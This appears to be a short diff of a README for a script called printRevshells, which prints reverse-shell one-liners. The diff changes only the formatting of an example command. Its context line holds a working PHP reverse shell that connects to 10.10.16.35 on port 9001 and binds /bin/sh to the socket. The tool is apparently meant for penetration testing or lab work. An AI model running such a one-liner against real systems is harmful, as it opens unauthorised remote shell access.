@@ -57,7 +57,7 @@ php -r '$sock=fsockopen("10.10.16.35",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
 By default, *if no arguments are provided*, the script will use 9001 as the default port. You can customize this easily on the script.
 
 However, if you want to specify your own port, you can execute the script as follows.
-> printRevshells 1234
+`` printRevshells 1234``
 
 Which generates the following output:
 
